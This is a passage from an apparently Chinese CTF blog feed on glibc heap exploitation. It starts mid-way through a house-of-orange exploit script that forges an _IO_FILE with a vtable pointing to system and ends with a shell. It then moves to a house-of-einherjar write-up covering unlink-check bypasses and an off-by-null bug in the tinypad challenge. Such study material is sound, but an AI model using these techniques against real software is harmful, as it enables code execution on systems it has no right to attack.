punctuation\">)</span> <span class=\"token comment\"># _IO_write_end</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_base</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_end</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_base</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_backup_base</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_end</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_markers</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_chain</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _fileno</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _flags2</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _old_offset</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>f <span class=\"token operator\">+=</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ushort _cur_colum;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _vtable_offset</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _shrotbuf[1]</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># null for alignment</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _offset</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _codecvt</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _wide_data</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_list</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_buf</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># __pad5</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _mode 为了绕过检查，fp->mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _unused2</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>p <span class=\"token operator\">+=</span> f</pre></td></tr><tr><td data-num=\"165\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token comment\"># alignment to vtable</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase <span class=\"token operator\">+</span> <span class=\"token number\">0x23010</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># vtable 指向自己</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_overflow 位置改为 system</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>payload <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x181</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\t</pre></td></tr><tr><td data-num=\"176\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>Mea<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>house-of-orange，其实难度不高。但是在影响以后的攻击起到了巨大的作用</p>\n</blockquote>\n<blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9ob3VzZS1vZi1vcmFuZ2Uv\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLndqaHdqaG4uY29tL3Bvc3RzL2hvdXNlLW9mLW9yYW5nZS0lRTUlQUQlQTYlRTQlQjklQTAlRTglQUUlQjAlRTUlQkQlOTUv\">https://blog.wjhwjhn.com/posts/house-of-orange - 学习记录 /</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yb2Rlcmlja2NoYW4uZ2l0aHViLmlvL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNS1ob3VzZS1vZi1vcmFuZ2U=\">Glibc 堆利用之 house of 系列总结 - roderick - record and learn! (roderickchan.github.io)</span></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-orange"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/13/house-of-einherjar/",
            "url": "https://yhuanhuan01.github.io/2024/07/13/house-of-einherjar/",
            "title": "house-of-einherjar",
            "date_published": "2024-07-13T15:38:31.000Z",
            "content_html": "<h1 id=\"house-of-einherjar\"><a class=\"markdownIt-Anchor\" href=\"#house-of-einherjar\">#</a> house-of-einherjar</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>溢出写、 <code>off by one</code> 、 <code>off by null</code></p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li>\n<p>2.23—— 至今</p>\n</li>\n<li>\n<p>可分配大于处于  <code>unsortedbin</code>  的  <code>chunk</code></p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>释放堆块时，unlink 后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。</p>\n<p>free 的后向合并机制</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate backward */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      prevsize <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>prev_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<blockquote>\n<p>2.27 之前</p>\n</blockquote>\n<ul>\n<li>unlink 检测</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      \\</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>2.27 之后</p>\n</blockquote>\n<ul>\n<li>unlink 检测</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span><span class=\"token function\">next_chunk</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>      \\</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted size vs. prev_size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      \\</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<p>one:</p>\n<ul>\n<li>申请  <code>chunk A、chunk B、chunk C、chunk D</code> ， <code>chunk D</code>  用来做  <code>gap</code> ， <code>chunk A、chunk C</code>  都要处于  <code>unsortedbin</code>  范围</li>\n<li>释放  <code>A</code> ，进入  <code>unsortedbin</code></li>\n<li>对  <code>B</code>  写操作的时候存在  <code>off by null</code> ，修改了  <code>C</code>  的  <code>P</code>  位</li>\n<li>释放  <code>C</code>  的时候，堆后向合并，直接把  <code>A、B、C</code>  三块内存合并为了一个  <code>chunk</code> ，并放到了  <code>unsortedbin</code>  里面</li>\n<li>读写合并后的大  <code>chunk</code>  可以操作  <code>chunk B</code>  的内容， <code>chunk B</code>  的头</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>已有两个 chunk（最后一个 chunk，和倒数第二个 chunk），释放倒数第二个 chunk</li>\n<li>重新把倒数第二个 chunk 申请回来，在最后一个内存空间（lastchunk-&gt;presize）的位置写入 offset（可以索引到 fakechunk），同时溢出 “\\x00” 覆盖 lastchunk 的 P 位（lastchunk-&gt;size）</li>\n<li>提前在 fakechunk 处伪造好数据：presize（offset），size，FD，BK，FDsize，BKsize，padding，size</li>\n<li>释放 lastchunk</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9oZWFwL2hvdXNlLW9mLWVpbmhlcmphci8yMDE2X3NlY2Nvbl90aW55cGFk\">ctf-challenges/pwn/heap/house-of-einherjar/2016_seccon_tinypad at master · ctf-wiki/ctf-challenges (github.com)</span></p>\n<p>源码比较长，简言之。可以去申请四个 chunk，申请最大至 0x100</p>\n<p>比较重要的是</p>\n<p><img data-src=\"/img/house-of-einherjar/image-20240713073236669.png\" alt=\"image-20240713073236669\"></p>\n<p>此处有 off-by-null 漏洞</p>\n<blockquote>\n<p>可以达成 house-of-einherjar 条件</p>\n</blockquote>\n<p>这个题虽然是低版本 libc， <code>house-of-einherjar</code>  的利用还是比较复杂的</p>\n<p>下面分析代码可能比较长，因为需要去理解程序在干了什么，才能更好的利用 <code>house-of-einherjar</code></p>\n<blockquote>\n<p>Add 片段</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">!=</span> <span class=\"token char\">'A'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_41<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v20 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">//v20 作为计数器，记录 tinypad 数量，下面用 count 代表 v20</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        v9 <span class=\"token operator\">=</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span>v9<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token operator\">++</span>v20<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v20 <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 若等于四个，则不能继续申请了。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No space is left.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        v22 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(SIZE)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        v22 <span class=\"token operator\">=</span> <span class=\"token function\">read_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v22 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          v10 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>          v10 <span class=\"token operator\">=</span> v22<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>v22 <span class=\"token operator\">></span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">//v22 返回 size，最大为 0x100</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            v10 <span class=\"token operator\">=</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        v22 <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v20 <span class=\"token operator\">+</span> <span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span><span class=\"token comment\">// 记录 size</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v20 <span class=\"token operator\">+</span> <span class=\"token number\">264</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>v22<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 记录申请 chunk 的地址</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        v11 <span class=\"token operator\">=</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span>v11 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>          <span class=\"token function\">writerrln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!] No memory is available.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">27LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13LL</span><span class=\"token punctuation\">,</span> v11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token function\">read_until</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v20 <span class=\"token operator\">+</span> <span class=\"token number\">264</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v22<span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以 v22 长度输入到 chunk</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nAdded.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>Del 片段</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">==</span> <span class=\"token char\">'D'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11LL</span><span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      count <span class=\"token operator\">=</span> <span class=\"token function\">read_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> count <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> count <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>LABEL_29<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid index\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span 